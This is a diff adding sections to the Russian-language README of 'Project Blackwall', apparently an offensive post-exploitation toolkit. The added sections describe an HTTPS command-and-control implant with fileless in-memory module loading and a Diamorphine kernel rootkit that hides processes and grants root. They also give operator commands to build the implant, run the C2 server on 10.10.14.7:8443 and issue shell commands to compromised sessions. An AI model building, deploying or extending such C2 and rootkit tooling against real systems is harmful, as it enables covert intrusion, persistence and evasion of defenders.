@@ -8,6 +8,26 @@
 
 <font color="#ff0000">**PROJECT BLACKWALL**</font>
 
+---
+
+## <font color="#ff0037">🆕 MX:// WHAT'S NEW // 2026.11</font>
+
+- **HTTPS C2 / Stage-0** (`-X`): защищённый канал «контроллер ↔ холм» с TLS 1.2+, пиннингом сертификата (CA + SHA256 fingerprint) и HMAC-подписью каждого запроса.
+- **Anti-replay**: timestamp + nonce + окно 5 минут, nonce-кэш на сервере.
+- **Модульная догрузка**: stage-0 несёт только стартовый набор (`recon`), остальные модули прилетают по HTTPS и исполняются из памяти. Новые модули можно регистрировать на лету через `add-module`.
+- **Запечатанные модули**: authenticated-encryption на HMAC-SHA256, shell/python — через stdin, ELF — через `memfd_create`.
+- **mTLS** (`--c2-mtls`): клиентский сертификат, подписанный тем же pinned CA.
+- **Diamorphine**: опциональный LKM-модуль `diamorphine` собирает/загружает руткит, патчит `MAGIC_PREFIX` на `blk_`, скрывает `blk_kit`, умеет `hide-pid | give-root | toggle | unload`.
+- **Скоупинг секретов**: `BW_SECRET_B64` / `BW_CA_PEM_B64` получает только модуль с `# SECRET: 1` (сейчас — `persist`); `recon` больше не светит их в `env`.
+- **Тематика вывода**: C2-баннеры, цветной `[C2]`, финальные цитаты ИИ в `build / server / ctl / stage / -B`.
+- **Фикс `-B`**: нижняя линия быстрого аудита снова окрашена (была опечатка `${TXT_}`), добавлена финальная цитата.
+- Подробное руководство: [`king/c2/README.md`](king/c2/README.md).
+- Полный список изменений: [`CHANGELOG.md`](CHANGELOG.md).
+
+---
+
+## <font color="#ff0037">☣️ MX:// MODULE CAPABILITIES</font>
+
 Модульность системы обеспечивается изолированными демонами (`daemons/`):
 
 | Модуль | Флаг | Описание и функции |
@@ -28,6 +48,7 @@
 | **<font color="#ff5a5a">Troll Sabotage</font>** | `-T` | Обратная порча инструментария (`chmod o-x`, alias-замедлители), гайд по `disable_functions`. |
 | **<font color="#ff5a5a">Wall</font>** | `-Z` | Ротация паролей, `authorized_keys`, iptables-цепочка `BLK_IN`, `sudoers.d`. |
 | **<font color="#ff5a5a">Ring-3 Hook</font>** | `-o` | Разведка и хук бинаря захвата: `map`, `uid` (geteuid→0), `token` (подмена argv в `execve`). |
+| **<font color="#ff5a5a">HTTPS C2 / Stage-0</font>** | `-X` | TLS-пиннинг, HMAC-подпись, anti-replay, зашифрованные модули в памяти, mTLS, модульная догрузка. |
 | **<font color="#ff5a5a">Post-Root Check</font>** | `-C` | SUID/SGID, capabilities, cron, writable `/etc`, `/proc/1/environ`, поиск флагов. |
 
 ---
@@ -54,6 +75,13 @@ sudo apt update && sudo apt install -y \
 ```bash
 sudo apt install -y \
     aircrack-ng hcxtools iw wireless-tools
+```
+
+### <font color="#ff4100">HTTPS C2 / Stage-0</font>
+```bash
+sudo apt install -y openssl python3 gcc make
+# Diamorphine (optional) needs matching headers:
+sudo apt install -y "linux-headers-$(uname -r)"
 ```
 
 ### <font color="#ff4100">Движок ускорения CUDA (WSL2 / Linux Hashcat)</font>
@@ -119,6 +147,20 @@ sudo ./blackwall.sh -t <IP> [ОПЦИИ]
   ./blackwall.sh -H
   ./blackwall.sh -Y --status
   ```
+
+* **<font color="#ff5a5a">HTTPS C2: сборка, сервер и операторский пульт:</font>**
+  ```bash
+  sudo ./blackwall.sh -X build  -q --c2-host 10.10.14.7 --c2-port 8443
+  sudo ./blackwall.sh -X server -q --c2-host 10.10.14.7 --c2-port 8443
+  ./blackwall.sh -X ctl -- sessions
+  ./blackwall.sh -X ctl -- shell s-1a2b3c4d 'id; hostname'
+  ./blackwall.sh -X ctl -- module s-1a2b3c4d recon
+  ```
+
+  Stage-0 — минимальный имплант (~25 KB) с TLS-пиннингом и HMAC-подписью.
+  Модули (`recon`, `persist`, `shadow`, `wall`, `capture`, `troll`,
+  `diamorphine`) догружаются по HTTPS, расшифровываются в памяти и не
+  оставляют файлов на диске. Подробности: `king/c2/README.md`.
 
 ---
 
